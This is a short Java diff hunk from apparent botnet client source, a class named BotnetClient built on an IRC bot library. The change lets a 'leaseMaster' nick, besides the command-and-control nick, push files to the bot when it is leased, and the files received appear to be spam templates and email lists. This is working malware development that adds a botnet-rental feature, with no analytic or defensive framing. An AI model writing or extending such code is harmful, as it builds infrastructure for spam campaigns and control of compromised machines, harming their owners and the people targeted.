@@ -179,7 +179,7 @@ public class BotnetClient extends PircBot {
 	}
 	
 	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
-		if (transfer.getNick().equals(CC)) {
+		if (transfer.getNick().equals(CC) || leased && transfer.getNick().equals(leaseMaster)) {
 			String fileName = transfer.getFile().getName();
 			System.out.println("Receiving file: " + fileName);
 			if (fileName.equals(TEMPLATE) || fileName.equals(EMAILS)) {
